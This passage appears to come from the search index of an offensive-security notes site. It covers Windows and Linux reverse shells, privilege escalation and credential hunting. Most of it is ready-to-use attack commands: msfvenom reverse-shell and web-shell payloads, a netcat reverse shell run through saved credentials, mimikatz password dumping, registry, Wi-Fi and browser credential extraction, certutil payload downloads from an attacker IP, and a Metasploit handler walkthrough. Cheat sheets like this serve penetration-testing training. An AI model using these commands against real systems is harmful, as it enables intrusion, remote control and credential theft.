shell-x86.exe</code> x64 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; shell-x64.exe</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#stageless-payloads-for-windows","title":"Stageless payloads for Windows","text":"Architecture Command x86 <code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; shell-x86.exe</code> x64 <code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; shell-x64.exe</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#staged-payloads-for-linux","title":"Staged payloads for Linux","text":"Architecture Command x86 <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x86.elf</code> x64 <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x64.elf</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#stageless-payloads-for-linux","title":"Stageless payloads for Linux","text":"Architecture Command x86 <code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x86.elf</code> x64 <code>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x64.elf</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#meterpreter-web-payloads","title":"Meterpreter web payloads","text":"Format Command asp <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f asp &gt; shell.asp</code> jsp <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw &gt; shell.jsp</code> war <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f war &gt; shell.war</code> php <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw &gt; shell.php</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#non-meterpreter-binaries","title":"Non-Meterpreter binaries","text":""},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#staged-payloads-for-windows_1","title":"Staged payloads for Windows","text":"Architecture Command x86 <code>msfvenom -p windows/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; shell-x86.exe</code> x64 <code>msfvenom -p windows/x64/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; shell-x64.exe</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#stageless-payloads-for-windows_1","title":"Stageless payloads for Windows","text":"Architecture Command x86 <code>msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; shell-x86.exe</code> x64 <code>msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe &gt; shell-x64.exe</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#staged-payloads-for-linux_1","title":"Staged payloads for Linux","text":"Architecture Command x86 <code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x86.elf</code> x64 <code>msfvenom -p linux/x64/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x64.elf</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#stageless-payloads-for-linux_1","title":"Stageless payloads for Linux","text":"Architecture Command x86 <code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x86.elf</code> x64 <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf &gt; shell-x64.elf</code>"},{"location":"Offensive-Security/Windows-Environment/General/Reverse-Shells/MSFvenom/#non-meterpreter-web-payloads","title":"Non-Meterpreter web payloads","text":"Format Command asp <code>msfvenom -p windows/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f asp &gt; shell.asp</code> jsp <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw &gt; shell.jsp</code> war <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f war &gt; shell.war</code> php <code>msfvenom -p php/reverse_php LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw &gt; shell.php</code>"},{"location":"Offensive-Security/Windows-Environment/General/Tricks/Who-Logged-In-and-When/","title":"Who Logged In and When","text":"<ol> <li> <p>Open the Start menu, type gpedit.msc, and press Enter.</p> </li> <li> <p>In the Group Policy Editor, navigate to: Local Computer Policy \u2192 Computer Configuration \u2192 Windows Settings \u2192 Security Settings \u2192 Local Policies \u2192 Audit Policy.</p> </li> <li> <p>Double-click on Audit Logon Events. In the window that appears, check both the \"Success\" and \"Failure\" options, then click OK.</p> </li> <li> <p>Return to the Start menu, type Event Viewer, and press Enter.</p> </li> <li> <p>In the Event Viewer, expand Windows Logs and select Security.</p> </li> <li> <p>Look for events with Event ID 4624, which indicate successful login attempts.</p> </li> <li> <p>Double-click on any event to view the time and additional details about the login.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/Chisel/","title":"Chisel","text":"<p>todo</p>"},{"location":"Offensive-Security/Windows-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/Ligolo-ng/","title":"Ligolo-ng","text":"<p>todo</p>"},{"location":"Offensive-Security/Windows-Environment/Pivoting-Tunneling-and-Port-Forwarding/Pivoting/Meterpreter/","title":"Meterpreter","text":"<p>todo</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/","title":"Credential Hunting","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#file-searching-commands","title":"File searching commands","text":"<ol> <li> <p>Search for potentially risky files in the current directory and subdirectories: <code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*</code></p> </li> <li> <p>Search for cleartext credentials in XML files: <code>gci * -Include *.xml -Recurse -EA SilentlyContinue | select-string cpassword</code></p> </li> <li> <p>Search for IIS web.config files: <code>Get-Childitem \u2013Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue</code></p> </li> <li> <p>Find files containing the word \"password\" across common configuration file types: <code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.ps1 *.bat *.zip</code></p> </li> <li> <p>Hunt for SAM and SYSTEM backups: <code>cd C: &amp; dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK</code></p> </li> <li> <p>Use winPEAS to search for credential files: <code>.\\winPEASany.exe quiet cmd searchfast filesinfo</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#searching-for-credentials-in-the-registry","title":"Searching for credentials in the registry","text":"<ol> <li>Search for passwords in <code>HKLM</code>: <code>reg query HKLM /f password /t REG_SZ /s</code></li> <li>Search for passwords in <code>HKCU</code>: <code>reg query HKCU /f password /t REG_SZ /s</code></li> <li>Retrieve PuTTY credentials: <code>reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions /f \"Proxy\" /s</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#saved-windows-credentials","title":"Saved Windows credentials","text":"<p>Windows allows saving credentials for reuse. These commands help enumerate and leverage them:</p> <ol> <li>Identify saved credentials with winPEAS: <code>.\\winPEASx64.exe quiet cmd windowscreds</code></li> <li>Check AutoLogon credentials in the registry: <code>reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"</code></li> <li>Extract plaintext passwords from memory with mimikatz: <code>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"</code></li> <li>Manually list saved credentials: <code>cmdkey /list</code></li> <li>Run commands with saved credentials: <code>runas /savecred /user:admin cmd.exe</code></li> <li>Start a Netcat listener: <code>nc -lvnp 1337</code></li> <li>Use saved credentials to trigger a reverse shell: <code>runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator \"c:\\temp\\nc.exe [IP-ADDRESS] 1337 -e cmd.exe\"</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#powershell-history-file","title":"PowerShell history file","text":"<ol> <li>Locate the PowerShell history file: <code>(Get-PSReadLineOption).HistorySavePath</code></li> <li>Read contents of the history file: <code>gc (Get-PSReadLineOption).HistorySavePath</code></li> <li>Retrieve history for all users: <code>foreach($user in ((ls C:\\users).fullname)){cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#browser-credentials","title":"Browser credentials","text":"<ol> <li>Extract browser credentials with LaZagne: <code>lazagne.exe browsers</code></li> <li>Example: Search Chrome dictionary file for \"password\": <code>gc 'C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#powershell-credentials","title":"PowerShell credentials","text":"<ol> <li>Import credentials from XML: <code>$credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'</code></li> <li>Retrieve username: <code>$credential.GetNetworkCredential().Username</code></li> <li>Retrieve password: <code>$credential.GetNetworkCredential().Password</code></li> <li> <p>Full example:  </p> <pre><code>$credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'\n$username = $credential.GetNetworkCredential().Username\n$password = $credential.GetNetworkCredential().Password\n\"Username: $username\"\n\"Password: $password\"\n</code></pre> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#sticky-notes-passwords","title":"Sticky Notes passwords","text":"<ol> <li>Locate Sticky Notes database: <code>ls C:\\Users\\[USER]\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState</code></li> <li>Allow PowerShell execution in current process: <code>Set-ExecutionPolicy Bypass -Scope Process</code></li> <li>Navigate to the PSSQLite module directory: <code>cd .\\PSSQLite\\</code></li> <li>Import the PSSQLite module: <code>Import-Module .\\PSSQLite.psd1</code></li> <li>Define the database path: <code>$db = 'C:\\Users\\[USER]\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite'</code></li> <li>Query the database: <code>Invoke-SqliteQuery -Database $db -Query \"SELECT Text FROM Note\" | Format-Table -Wrap</code></li> <li>Alternative: dump contents with <code>strings</code>: <code>strings 'C:\\Users\\[USER]\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite-wal'</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#wi-fi-passwords","title":"Wi-Fi passwords","text":"<ol> <li>List saved wireless networks: <code>netsh wlan show profile</code></li> <li>Retrieve password for a profile: <code>netsh wlan show profile [PROFILE-NAME] key=clear</code></li> <li>One-liner to extract all saved Wi-Fi passwords: <code>cls &amp; echo. &amp; for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\" | find /v \"Number\" &amp; echo.) &amp; @echo on</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#unattendxml","title":"Unattend.xml","text":"<p>Windows Deployment Services often leave unattended installation files containing admin credentials.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#manually-check-common-locations","title":"Manually check common locations","text":"<ul> <li><code>C:\\Unattend.xml</code> </li> <li><code>C:\\Windows\\Panther\\Unattend.xml</code> </li> <li><code>C:\\Windows\\Panther\\Unattend\\Unattend.xml</code> </li> <li><code>C:\\Windows\\System32\\sysprep.inf</code> </li> <li><code>C:\\Windows\\System32\\sysprep\\sysprep.xml</code></li> </ul>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Credential-Hunting/#automatically-search","title":"Automatically search","text":"<ol> <li>Find unattended/sysprep files: <code>Get-ChildItem \u2013Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue</code></li> <li>Search for specific filenames: <code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code></li> <li>Search for \"password\" in all files: <code>findstr /spin \"password\" *.*</code></li> <li> <p>Example from <code>Unattend.xml</code>:  </p> <pre><code>&lt;AutoLogon&gt;\n    &lt;Password&gt;\n        &lt;Value&gt;HackFast_p@ss&lt;/Value&gt;\n        &lt;PlainText&gt;true&lt;/PlainText&gt;\n    &lt;/Password&gt;\n    &lt;Enabled&gt;true&lt;/Enabled&gt;\n    &lt;LogonCount&gt;2&lt;/LogonCount&gt;\n    &lt;Username&gt;Administrator&lt;/Username&gt;\n&lt;/AutoLogon&gt;\n</code></pre> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Strategy/","title":"Strategy","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Strategy/#step-1-automated-enumeration-tools","title":"Step 1. Automated enumeration tools","text":"<ol> <li>Run winPEAS to gather extensive information about the system: <code>.\\winpeas.exe cmd &gt; output.txt</code></li> <li>Run Seatbelt for a broader range of checks: <code>.\\Seatbelt.exe -group=all -full &gt; output.txt</code></li> <li>If scripts fail, use manual commands (see the enumeration section).</li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Strategy/#step-2-review-and-analyze-enumeration-results","title":"Step 2. Review and analyze enumeration results","text":"<ol> <li>Carefully review results: Tools like winPEAS and Seatbelt produce large amounts of output. Take time to understand it.  </li> <li>Make notes of interesting findings such as misconfigurations, sensitive files, or unusual permissions.  </li> <li>Avoid rabbit holes: Prioritize promising leads instead of chasing low-value findings.  </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Strategy/#step-3-file-and-directory-inspection","title":"Step 3. File and directory inspection","text":"<ol> <li>Inspect common directories for sensitive files, such as:  <ul> <li><code>C:\\</code> </li> <li><code>C:\\Program Files</code> </li> <li><code>C:\\Users\\Public\\Desktop</code> </li> </ul> </li> <li>Read through any interesting files they may contain credentials, configuration details, or escalation clues.  </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Strategy/#step-4-quick-wins","title":"Step 4. Quick wins","text":"<ol> <li>Prioritize easy methods: Look for registry exploits, weak service permissions, or obvious misconfigurations.  </li> <li>Check running administrative processes, note versions, and search for known exploits.  </li> <li>Identify internal ports that may be forwarded to your attacker machine for lateral movement or privilege escalation.  </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Strategy/#step-5-re-evaluate-enumeration-data","title":"Step 5. Re-evaluate enumeration data","text":"<ol> <li>If privilege escalation is not yet achieved, review all collected data again.  </li> <li>Highlight anything unusual: unfamiliar processes, suspicious file names, or unexpected users.  </li> <li>Reconsider kernel exploits as a last resort.  </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Strategy/#general-tips","title":"General tips","text":"<ol> <li>Stay calm and methodical \u2014 privilege escalation often requires patience.  </li> <li>Document your findings meticulously. Even small details may prove useful later.  </li> <li>Use multiple tools: different tools (winPEAS, Seatbelt, manual enumeration) reveal different insights.  </li> <li>Focus on quick wins: weak permissions, stored credentials, or misconfigured services.  </li> <li>Be ready to adapt: if one approach fails, reassess and try alternatives.  </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/","title":"System Enumeration","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#information-you-need-to-gather","title":"Information you need to gather","text":"<ol> <li>Username and hostname  </li> <li>Group memberships of the current user  </li> <li>Existing users and groups  </li> <li>Operating system, version, and architecture  </li> <li>Network information  </li> <li>Installed applications  </li> <li>Running processes  </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#system-information","title":"System information","text":"<ol> <li>Display detailed configuration info: <code>systeminfo</code></li> <li>Show computer hostname: <code>hostname</code></li> <li>Get OS name, service pack, architecture, and version: <code>wmic os get Caption,CSDVersion,OSArchitecture,Version</code></li> <li>Fetch OS details with PowerShell: <code>Get-WmiObject -Class Win32_OperatingSystem</code></li> <li>Filter only OS name and version: <code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"</code></li> <li>Retrieve comprehensive info: <code>Get-ComputerInfo</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#user-information","title":"User information","text":"<ol> <li>Current username: <code>whoami</code></li> <li>List all user accounts: <code>net user</code></li> <li>Show RDP session users: <code>query user</code></li> <li>List all admin group members: <code>net localgroup administrators</code></li> <li>List local users with PowerShell: <code>Get-LocalUser</code></li> <li>List admin group members with PowerShell: <code>Get-LocalGroupMember -Group \"Administrators\"</code></li> <li>Detailed user account info: <code>Get-WmiObject -Class Win32_UserAccount</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#network-information","title":"Network information","text":"<ol> <li>Show all TCP/IP config: <code>ipconfig /all</code></li> <li>Display active connections and ports: <code>netstat -ano</code></li> <li>Show IP routing table: <code>route print</code></li> <li>Display ARP cache: <code>arp -a</code></li> <li>IP addresses (PowerShell): <code>Get-NetIPAddress</code></li> <li>Full network config (PowerShell): <code>Get-NetIPConfiguration</code></li> <li>List network adapters: <code>Get-NetAdapter</code></li> <li>Test connection: <code>Test-Connection -ComputerName [hostname]</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#list-installed-programs","title":"List installed programs","text":"<ol> <li>Enumerate installed programs: <code>Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime</code></li> <li>Check installed AV products: <code>WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName</code></li> <li>Programs via PowerShell: <code>Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version</code></li> <li>Programs via registry: <code>Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate</code></li> <li>List installed packages: <code>Get-Package</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#scheduled-tasks","title":"Scheduled tasks","text":"<ol> <li>List all tasks (verbose): <code>schtasks /query /fo LIST /v</code></li> <li>Scheduled tasks via PowerShell: <code>Get-ScheduledTask | Get-ScheduledTaskInfo</code></li> <li>Details of a specific task: <code>schtasks /query /tn &lt;taskname&gt;</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#services-and-drivers","title":"Services and drivers","text":"<ol> <li>Show processes running as SYSTEM: <code>tasklist /v /fi \"username eq system\"</code></li> <li>List active services: <code>sc query</code></li> <li>List installed drivers: <code>driverquery</code></li> <li>Get service status (PowerShell): <code>Get-Service</code></li> <li>Detailed service info (PowerShell): <code>Get-WmiObject -Class Win32_Service</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#check-permissions-on-filesfolders","title":"Check permissions on files/folders","text":"<ol> <li>Show or modify ACLs: <code>icacls \"C:\\Path\\to\\folder\"</code></li> <li>Retrieve ACLs (PowerShell): <code>Get-Acl \"C:\\Path\\to\\folder\"</code></li> <li>Use AccessChk from Sysinternals: <code>AccessChk.exe -d \"C:\\Path\\to\\folder\"</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#list-user-privileges","title":"List user privileges","text":"<ol> <li>Show current user privileges: <code>whoami /priv</code></li> <li>Local user details (PowerShell): <code>Get-LocalUser | Select-Object Name, Enabled, PasswordLastSet, LastLogon</code></li> <li>List assigned privileges (PowerShell): <code>Get-Privilege</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#active-connections-and-listening-ports","title":"Active connections and listening ports","text":"<ol> <li>Show active connections: <code>netstat -ano</code></li> <li>TCP connections (PowerShell): <code>Get-NetTCPConnection</code></li> <li>UDP endpoints (PowerShell): <code>Get-NetUDPEndpoint</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#firewall-rules","title":"Firewall rules","text":"<ol> <li>List all firewall rules: <code>netsh advfirewall firewall show rule name=all</code></li> <li>Firewall rules via PowerShell: <code>Get-NetFirewallRule</code></li> <li>Firewall profile settings: <code>Get-NetFirewallProfile</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#dns-cache","title":"DNS cache","text":"<ol> <li>Show DNS cache: <code>ipconfig /displaydns</code></li> <li>DNS cache via PowerShell: <code>Get-DnsClientCache</code></li> <li>Clear DNS cache: <code>Clear-DnsClientCache</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#viewing-recent-documents","title":"Viewing recent documents","text":"<ol> <li>List recent documents: <code>type %userprofile%\\Recent\\*.lnk</code></li> <li>With names and timestamps: <code>Get-ChildItem \"$env:UserProfile\\Recent\" | Select-Object Name, LastAccessTime</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#list-large-files","title":"List large files","text":"<ol> <li>Find large files: <code>Get-ChildItem -Path C:\\ -Recurse | Sort-Object Length -Descending</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#check-autostart-entries","title":"Check autostart entries","text":"<ol> <li>Startup programs (all users): <code>reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li> <li>Startup programs (current user): <code>reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li> <li>Via PowerShell: <code>Get-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#check-for-installed-applications","title":"Check for installed applications","text":"<ol> <li>Registry method: <code>reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall</code></li> <li>PowerShell method: <code>Get-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\"</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#clipboard-contents","title":"Clipboard contents","text":"<ol> <li>Read clipboard contents: <code>Get-Clipboard</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#list-loaded-dlls-for-processes","title":"List loaded DLLs for processes","text":"<ol> <li>List processes with loaded DLLs: <code>tasklist /m</code></li> <li>Process modules via PowerShell: <code>Get-Process | Select-Object Name, Modules</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#windows-event-logs","title":"Windows event logs","text":"<ol> <li>List all event logs: <code>wevtutil el</code></li> <li>Query system logs: <code>wevtutil qe /f:text System</code></li> <li>Latest 100 system events: <code>Get-EventLog -LogName System -Newest 100</code></li> <li>Latest 50 security events: <code>Get-WinEvent -LogName Security -MaxEvents 50</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#running-processes","title":"Running processes","text":"<ol> <li>List running processes: <code>tasklist</code></li> <li>Running processes (PowerShell): <code>Get-Process</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#get-detailed-system-information","title":"Get detailed system information","text":"<ol> <li>Detailed system info: <code>Get-ComputerInfo</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#network-configuration","title":"Network configuration","text":"<ol> <li>Show network config: <code>Get-NetIPConfiguration</code></li> <li>List adapters: <code>Get-NetAdapter</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#installed-hotfixes","title":"Installed hotfixes","text":"<ol> <li>List hotfixes: <code>wmic qfe list</code></li> <li>Hotfixes via PowerShell: <code>Get-HotFix</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#environment-variables","title":"Environment variables","text":"<ol> <li>Show environment variables: <code>set</code></li> <li>PowerShell: <code>Get-ChildItem Env:</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#running-tasks","title":"Running tasks","text":"<ol> <li>List scheduled tasks: <code>schtasks</code></li> <li>PowerShell: <code>Get-ScheduledTask</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#system-uptime","title":"System uptime","text":"<ol> <li>Show uptime with server stats: <code>net stats srv</code></li> <li>PowerShell uptime: <code>Get-Uptime</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/System-Enumeration/#powershell-execution-policy","title":"PowerShell execution policy","text":"<ol> <li>Show current execution policy: <code>Get-ExecutionPolicy</code></li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Enumeration-Kernel-Vuln/","title":"Enumeration Kernel Vuln","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Enumeration-Kernel-Vuln/#manual-enumeration","title":"Manual enumeration","text":"<ol> <li> <p>Use the <code>systeminfo</code> command to collect detailed information about the system, including the OS version, system architecture, and installed hotfixes (KBs). <code>systeminfo</code></p> <p></p> <p>Note: In the provided output, we can identify the system as Windows 7 Pro \u2013 Build 7601 \u2013 x64-based (64-bit). It also shows that three hotfixes have been installed on this host.</p> </li> <li> <p>To obtain more details about the installed hotfixes, use: <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code> </p> <p></p> <p>Note: Microsoft has shifted away from using MS bulletin numbers (e.g., \u201cMS17-010\u201d) to reference vulnerabilities. Since late 2017/early 2018, Microsoft uses the CVE (Common Vulnerabilities and Exposures) system. Modern kernel exploits are labeled with CVE-20XX-XXXX identifiers.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Enumeration-Kernel-Vuln/#enumerating-with-windows-exploit-suggester-wes-ng","title":"Enumerating with Windows Exploit Suggester (WES-NG)","text":"<ol> <li> <p>Run the <code>systeminfo</code> command on the target machine to gather system information. Copy the output and save it to a TXT file on the attacker machine.  </p> <p></p> </li> <li> <p>Update the WES-NG database to ensure the latest exploits are available: <code>python3 wes.py --update</code> </p> <p></p> </li> <li> <p>Analyze the system information to identify potential kernel exploits: <code>python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Enumeration-Kernel-Vuln/#enumerating-with-metasploit","title":"Enumerating with Metasploit","text":"<ol> <li> <p>Generate a reverse TCP Meterpreter payload for the target\u2019s architecture (x86 or x64) and save it as an executable: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f exe &gt; shell-x64.exe</code> </p> <p></p> <p>Note: Metasploit includes a built-in Local Exploit Suggester module that can help identify kernel exploits.</p> </li> <li> <p>Host the payload binary using a Python HTTP server and transfer it to the target with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/accesschk64.exe accesschk64.exe</code> </p> <p></p> </li> <li> <p>On the attacker machine, start a multi-handler listener in Metasploit: <code>msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 1337; run\"</code> </p> <p></p> </li> <li> <p>Execute the reverse shell binary on the target to establish a Meterpreter session: <code>.\\shell-x64.exe</code> </p> <p></p> </li> <li> <p>Load the Local Exploit Suggester in Metasploit:  </p> <pre><code>background\nsearch suggester\nuse 0\nset SESSION 1\nexploit\n</code></pre> <p></p> </li> <li> <p>After about a minute, Metasploit will provide a list of potential kernel exploits for the host. </p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Enumeration-Kernel-Vuln/#enumerating-with-watson","title":"Enumerating with Watson","text":"<ol> <li> <p>Transfer Watson to the target using any file transfer method (see File Transfer section). Example using <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/Watson.exe Watson.exe</code> </p> <p></p> <p>Note: Watson supports multiple versions of Windows 10 (1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004) and Windows Server (2016 &amp; 2019).</p> </li> <li> <p>Execute Watson on the target and review the output: <code>.\\Watson.exe</code></p> 